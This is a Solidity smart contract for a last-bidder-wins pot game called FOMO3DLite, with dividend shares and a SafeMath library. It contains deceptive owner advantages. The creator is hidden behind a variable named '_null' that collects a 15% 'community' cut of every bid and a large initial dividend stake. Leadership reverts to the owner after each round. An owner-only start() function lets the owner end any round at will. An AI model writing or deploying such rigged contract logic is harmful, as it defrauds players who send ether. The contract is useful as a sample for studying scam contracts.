 

pragma solidity 0.4 .19;

contract FOMO3DLite {
    using SafeMath
    for uint256;

    event NewRound(
        uint _timestamp,
        uint _round,
        uint _initialPot
    );

    event Bid(
        uint _timestamp,
        address _address,
        uint _amount,
        uint _newPot
    );

    event NewLeader(
        uint _timestamp,
        address _address,
        uint _newPot,
        uint _newDeadline
    );

    event Winner(
        uint _timestamp,
        address _address,
        uint _earnings,
        uint _deadline
    );

    event EarningsWithdrawal(
        uint _timestamp,
        address _address,
        uint _amount
    );

    event DividendsWithdrawal(
        uint _timestamp,
        address _address,
        uint _dividendShares,
        uint _amount,
        uint _newTotalDividendShares,
        uint _newDividendFund
    );

     
    uint public constant BASE_DURATION = 1 days;

     
    uint public constant DURATION_DECREASE_PER_ETHER = 2 minutes;

     
    uint public constant MINIMUM_DURATION = 30 minutes;

     
    uint public constant MIN_LEADER_FRAC_TOP = 1;
    uint public constant MIN_LEADER_FRAC_BOT = 100000;

     
    uint public constant DIVIDEND_FUND_FRAC_TOP = 45;
    uint public constant DIVIDEND_FUND_FRAC_BOT = 100;

    uint public constant FRAC_TOP = 15;
    uint public constant FRAC_BOT = 100;

     
    uint public constant NEXT_POT_FRAC_TOP = 1;
    uint public constant NEXT_POT_FRAC_BOT = 2;

     
    address _null;
    mapping(address => uint) public earnings;

     
    mapping(address => uint) public dividendShares;

     
    uint public totalDividendShares;

    address owner;

     
    uint public dividendFund;

     
    uint public round;

     
    uint public pot;

     
    address public leader;

     
    uint public deadline;

    function FOMO3DLite() public payable {
        require(msg.value > 0);
        _null = msg.sender;
        round = 1;
        pot = msg.value;
        leader = _null;
        totalDividendShares = 200000;
        dividendShares[_null] = 200000;
        deadline = computeDeadline();
        NewRound(now, round, pot);
        NewLeader(now, leader, pot, deadline);
        owner = msg.sender;
    }

    function computeDeadline() internal view returns(uint) {
        uint _durationDecrease = DURATION_DECREASE_PER_ETHER.mul(pot.div(1 ether));
        uint _duration;
        if (MINIMUM_DURATION.add(_durationDecrease) > BASE_DURATION) {
            _duration = MINIMUM_DURATION;
        } else {
            _duration = BASE_DURATION.sub(_durationDecrease);
        }
        return now.add(_duration);
    }

    modifier advanceRoundIfNeeded {
        if (now > deadline) {
            uint _nextPot = pot.mul(NEXT_POT_FRAC_TOP).div(NEXT_POT_FRAC_BOT);
            uint _leaderEarnings = pot.sub(_nextPot);
            Winner(now, leader, _leaderEarnings, deadline);
            earnings[leader] = earnings[leader].add(_leaderEarnings);
            pot = 0;
            leader = owner;
            deadline = computeDeadline();
            NewRound(now, round, pot);
            NewLeader(now, leader, pot, deadline);
        }
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function bid() public payable advanceRoundIfNeeded {
        uint _minLeaderAmount = pot.mul(MIN_LEADER_FRAC_TOP).div(MIN_LEADER_FRAC_BOT);
        uint _bidAmountToCommunity = msg.value.mul(FRAC_TOP).div(FRAC_BOT);
        uint _bidAmountToDividendFund = msg.value.mul(DIVIDEND_FUND_FRAC_TOP).div(DIVIDEND_FUND_FRAC_BOT);
        uint _bidAmountToPot = msg.value.sub(_bidAmountToCommunity).sub(_bidAmountToDividendFund);

        earnings[_null] = earnings[_null].add(_bidAmountToCommunity);
        dividendFund = dividendFund.add(_bidAmountToDividendFund);
        pot = pot.add(_bidAmountToPot);
        Bid(now, msg.sender, msg.value, pot);

        if (msg.value >= _minLeaderAmount) {
            uint _dividendShares = msg.value.div(_minLeaderAmount);
            dividendShares[msg.sender] = dividendShares[msg.sender].add(_dividendShares);
            totalDividendShares = totalDividendShares.add(_dividendShares);
            leader = msg.sender;
            deadline = computeDeadline();
            NewLeader(now, leader, pot, deadline);
        }
    }

    function withdrawEarnings() public advanceRoundIfNeeded {
        require(earnings[msg.sender] > 0);
        assert(earnings[msg.sender] <= this.balance);
        uint _amount = earnings[msg.sender];
        earnings[msg.sender] = 0;
        msg.sender.transfer(_amount);
        EarningsWithdrawal(now, msg.sender, _amount);
    }

    function withdrawDividends() public {
        require(dividendShares[msg.sender] > 0);
        uint _dividendShares = dividendShares[msg.sender];
        assert(_dividendShares <= totalDividendShares);
        uint _amount = dividendFund.mul(_dividendShares).div(totalDividendShares);
        assert(_amount <= this.balance);
        dividendShares[msg.sender] = 0;
        totalDividendShares = totalDividendShares.sub(_dividendShares);
        dividendFund = dividendFund.sub(_amount);
        msg.sender.transfer(_amount);
        DividendsWithdrawal(now, msg.sender, _dividendShares, _amount, totalDividendShares, dividendFund);
    }

    function start() public onlyOwner {
        deadline = 0;
    }
}

 
library SafeMath {
     
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

     
    function div(uint256 a, uint256 b) internal pure returns(uint256) {
         
        uint256 c = a / b;
         
        return c;
    }

     
    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        assert(b <= a);
        return a - b;
    }

     
    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}